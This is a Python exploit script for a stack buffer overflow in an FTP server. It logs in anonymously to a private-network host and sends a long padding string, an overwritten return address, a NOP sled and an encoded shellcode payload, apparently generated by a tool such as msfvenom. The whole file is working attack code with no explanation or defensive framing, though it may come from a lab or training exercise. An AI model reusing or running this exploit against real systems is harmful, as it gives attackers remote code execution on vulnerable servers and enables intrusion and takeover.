import sys, socket

offset = 251

crash = ("A" * offset)

eip = "\x71\xE8\xF1\x77"

nops = ("\x90" * 32)

buf =  b""
buf += b"\xd9\xee\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x52\xbb\xfb"
buf += b"\xb0\xaf\x89\x83\xe8\xfc\x31\x58\x13\x03\xa3\xa3\x4d"
buf += b"\x7c\xaf\x2c\x13\x7f\x4f\xad\x74\x09\xaa\x9c\xb4\x6d"
buf += b"\xbf\x8f\x04\xe5\xed\x23\xee\xab\x05\xb7\x82\x63\x2a"
buf += b"\x70\x28\x52\x05\x81\x01\xa6\x04\x01\x58\xfb\xe6\x38"
buf += b"\x93\x0e\xe7\x7d\xce\xe3\xb5\xd6\x84\x56\x29\x52\xd0"
buf += b"\x6a\xc2\x28\xf4\xea\x37\xf8\xf7\xdb\xe6\x72\xae\xfb"
buf += b"\x09\x56\xda\xb5\x11\xbb\xe7\x0c\xaa\x0f\x93\x8e\x7a"
buf += b"\x5e\x5c\x3c\x43\x6e\xaf\x3c\x84\x49\x50\x4b\xfc\xa9"
buf += b"\xed\x4c\x3b\xd3\x29\xd8\xdf\x73\xb9\x7a\x3b\x85\x6e"
buf += b"\x1c\xc8\x89\xdb\x6a\x96\x8d\xda\xbf\xad\xaa\x57\x3e"
buf += b"\x61\x3b\x23\x65\xa5\x67\xf7\x04\xfc\xcd\x56\x38\x1e"
buf += b"\xae\x07\x9c\x55\x43\x53\xad\x34\x0c\x90\x9c\xc6\xcc"
buf += b"\xbe\x97\xb5\xfe\x61\x0c\x51\xb3\xea\x8a\xa6\xb4\xc0"
buf += b"\x6b\x38\x4b\xeb\x8b\x11\x88\xbf\xdb\x09\x39\xc0\xb7"                                                                       
buf += b"\xc9\xc6\x15\x17\x99\x68\xc6\xd8\x49\xc9\xb6\xb0\x83"                                                                       
buf += b"\xc6\xe9\xa1\xac\x0c\x82\x48\x57\xc7\xa7\x8c\x57\x1c"
buf += b"\xd0\x8e\x57\x01\x3d\x06\xb1\x2f\x2d\x4e\x6a\xd8\xd4"
buf += b"\xcb\xe0\x79\x18\xc6\x8d\xba\x92\xe5\x72\x74\x53\x83"
buf += b"\x60\xe1\x93\xde\xda\xa4\xac\xf4\x72\x2a\x3e\x93\x82"
buf += b"\x25\x23\x0c\xd5\x62\x95\x45\xb3\x9e\x8c\xff\xa1\x62"
buf += b"\x48\xc7\x61\xb9\xa9\xc6\x68\x4c\x95\xec\x7a\x88\x16"
buf += b"\xa9\x2e\x44\x41\x67\x98\x22\x3b\xc9\x72\xfd\x90\x83"
buf += b"\x12\x78\xdb\x13\x64\x85\x36\xe2\x88\x34\xef\xb3\xb7"
buf += b"\xf9\x67\x34\xc0\xe7\x17\xbb\x1b\xac\x28\xf6\x01\x85"
buf += b"\xa0\x5f\xd0\x97\xac\x5f\x0f\xdb\xc8\xe3\xa5\xa4\x2e"
buf += b"\xfb\xcc\xa1\x6b\xbb\x3d\xd8\xe4\x2e\x41\x4f\x04\x7b"
payload = buf

buff = crash + eip + nops + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.0.71', 21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send(buff + '\r\n')
s.send('QUIT\r\n')
s.close()
